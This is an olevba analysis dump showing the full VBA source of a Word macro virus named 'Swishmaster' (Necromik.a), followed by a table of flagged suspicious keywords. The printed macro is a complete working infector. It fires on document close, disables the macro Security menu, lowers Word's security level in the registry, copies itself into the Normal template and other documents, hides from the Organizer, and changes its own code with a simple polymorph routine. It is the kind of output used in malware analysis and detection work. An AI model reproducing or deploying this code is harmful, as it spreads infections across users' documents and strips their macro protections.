olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Necromik.a-6977634c16d36483ec4671b7a3e861c7410e3009
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Necromik.a-6977634c16d36483ec4671b7a3e861c7410e3009 
in file: Virus.MSWord.Necromik.a-6977634c16d36483ec4671b7a3e861c7410e3009 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
'Word2003.Swishmaster
'code by Necronomikon[DCA]
'special thx to SerialKiller ex-CodeBreakers for providing me m$office03
n = 0
CommandBars("Macro").Controls("Security...").Enabled = n
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=n, Command:=" "
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Word\Security", "Level") = 1&
If GetAttr(ActiveDocument.FullName) = 1 Then
    SetAttr ActiveDocument.FullName, 0
    ActiveDocument.Reload
   End If
Set ad = ActiveDocument.VBProject.VBComponents(1)
Set nt = NormalTemplate.VBProject.VBComponents(1)
If nt.Name <> "swishmaster" Then
    Set bla = nt.CodeModule
    Set bla1 = ad.CodeModule
    bla.DeleteLines 1, bla.CountOfLines
    bla.InsertLines 1, bla1.Lines(1, bla1.CountOfLines)
    nt.Name = "swishmaster"
End If
If ad.Name <> "swishmaster" Then
    Set bla2 = ad.CodeModule
    Set bla3 = nt.CodeModule
    bla2.DeleteLines 1, bla2.CountOfLines
    bla2.InsertLines 1, bla3.Lines(1, bla3.CountOfLines)
    ad.Name = "swishmaster"
End If
If nt.Name = "swishmaster" Then
    NormalTemplate.Save
    NormalTemplate.Saved = True
End If
checker = Left(ActiveDocument.Name, 8)
If checker <> "Document" And IsNumeric(Right(ActiveDocument.Name, 1)) = False Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
Else
    ActiveDocument.Saved = True
End If
OurCode = NPE(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, _
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines))
SetAttr ActiveDocument.FullName, 1
End Sub
Sub payload()
Application.Caption = "***Swishmaster***"
Application.StatusBar = True
StatusBar = "(c)Necronomikon[DarkCoderzAlliance]"
Set dca = CreateObject("Agent.Control.1")
dca.Connected = True
If VBA.IsObject(dca) Then
dca.Characters.Load "Merlin", "Merlin.acs"
Set nec = dca.Characters("Merlin")
End If
With nec
.Top = 200
.Left = 200
.Show
End With
nec.Play "Greet"
nec.Speak "Here are you, " & Word.Application.UserName & " my lost sheep..." & "\Vol=99"
nec.Play "Read"
nec.Play "GetAttention"
nec.Speak "Listen to me!"
nec.Play "Idle1_1"
nec.Speak "The path to harmony leads over shining ground."
nec.Play "Acknowledge"
Do Until nec.hide.Status = 0
DoEvents
Loop
dca.Characters.Unload "Merlin"
End Sub
Sub ToolsSecurity()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = True
Dialogs(wdDialogToolsSecurity).Show
CommandBars("Macro").Controls("Security...").Enabled = False
End Sub

Sub FileTemplates()
On Error Resume Next
End Sub

Sub ToolsMacro()
On Error Resume Next
    Call Stealth
    Dialogs(wdDialogToolsMacro).Display
End Sub

Sub ViewVBCode()
On Error Resume Next
    Call Stealth
    ShowVisualBasicEditor = True
End Sub

Sub Stealth()
    On Error Resume Next
    Application.OrganizerDelete Source:=NormalTemplate.Name, _
    Name:="swishmaster", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerDelete Source:=ActiveDocument.Name, _
    Name:="swishmaster", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub
Sub FileSave()
    On Error Resume Next
Call payload
    ActiveDocument.Save
End Sub
Private Function NPE(poly)
Rem Necronomikon's Polymorph Engine
Dim VaR(6): On Error Resume Next: Randomize
VaR(1) = "poly": VaR(2) = "NPE": VaR(3) = "VaR": VaR(4) = "nec"
VaR(5) = "morph": VaR(6) = "NewVar"
For nec = 1 To 6
nec_nec = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
While InStr(1, poly, VaR(nec), vbTextCompare)
morph = InStr(1, poly, VaR(nec), vbTextCompare)
poly = Mid(poly, 1, morph - 1) & NewVar & Mid(poly, morph + Len(VaR(nec)), Len(poly) - morph)
Wend
Next
NPE = poly
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

